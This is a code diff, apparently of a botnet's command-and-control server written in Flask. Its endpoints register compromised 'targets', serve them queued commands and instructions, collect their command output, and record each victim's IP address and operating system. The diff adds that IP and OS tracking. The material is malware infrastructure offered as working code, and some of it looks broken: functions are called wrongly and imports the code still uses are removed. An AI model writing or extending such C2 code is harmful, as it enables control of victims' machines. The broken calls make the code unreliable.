@@ -23,11 +23,14 @@ def apiCommand(target_name):
         try:
 
             api_token = request.args('token')
+            IP = request.args('ip')
             valid = getlist(_session.query(ApiToken).filter(token=api_token).all(),sp=',')
 
             if valid:
                 apiCommand = getlist(_session.query(APICommand).filter_by(target_name=target_name,condition='0').all(),sp=',')
-
+                if IP != readFromJson()['target-info'][target_name]['ip']:
+                    data = readFromJson()['target-info'][target_name]
+                    writeToJson(data, 'ip',IP)
                 return {'allCommand': apiCommand},200
             
             else:
@@ -54,6 +57,7 @@ def save_output():
         try:
             token = request.json.get('token')
             target_name = request.json.get('target_name')
+            IP = request.json.get('ip')
             valid = getlist(_session.query(Targets).filter_by(target_name=target_name,token=token).all(),sp=',')
 
             if len(valid) != 0:
@@ -63,6 +67,10 @@ def save_output():
                 for output in outputs:
                     outputData = {output[0]: output[1]}
                     writeToJson(data=data,section='output',info=outputData)
+
+                if IP != readFromJson()['target-info'][target_name]['ip']:
+                    data = readFromJson()['target-info'][target_name]
+                    writeToJson(data, 'ip',IP)
 
                 return {'message': 'Outputs were seved'},200
             
@@ -95,17 +103,14 @@ def BotNet(target_name):
         return {'Error': "Unsupported method or didn't provid target name"},405
 
 
-from datetime import datetime
-from flask import request
-
 @api.route('/api/registor_target', methods=['POST'])
 def registor_target():
     if request.method == 'POST':
         try:
             apitoken = request.json.get('token')
-            print(apitoken)
             target_name = request.json.get('target_name')
-            print(target_name)
+            IP = request.json.get('ip')
+            opratingSystem = request.json.get('os')
 
             if not apitoken or not target_name:
                 return {'Error': 'Token or target_name not provided'}, 400
@@ -115,10 +120,15 @@ def registor_target():
             print(valid)
             if len(valid) != 0:
                 # Append datetime to target_name to make it unique
-                target_name = target_name + str(datetime.now())
-                target = Targets(target_name, valid[0][1], apitoken)
+                target_name = target_name + str(datetime.now()).replace(' ','')
+                target = Targets(target_name, valid[0][2].replace(' ',''), apitoken)
                 _session.add(target)
                 _session.commit()
+                data = {target_name: {
+                    'ip': IP,
+                    'os': opratingSystem
+                }}
+                writeToJson(readFromJson(), 'target-info',data)
 
                 return {'target_name': target_name}, 200  # Return 200 OK status
 
@@ -141,6 +151,7 @@ def instarction(target_name):
         try:
             print('i am the problame')
             token = request.args.get('token')
+            IP = request.args.get('ip')
             print(token)
             valid = getlist(_session.query(ApiToken).filter_by(token=token).all(),sp=',')
 
@@ -148,7 +159,12 @@ def instarction(target_name):
 
                 instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name).all(),sp=',')
                 if len(instraction) != 0:
+                    if IP != readFromJson()['target-info'][target_name]['ip']:
+                        data = readFromJson()['target-info'][target_name]
+                        writeToJson(data, 'ip',IP)
+
                     return {'delay': instraction[0][1],'instraction': instraction[0][-1]},200
+                
                 return {'Message': 'No instraction found'},404
             else:
                 return {'error': 'Invalid api token'},403
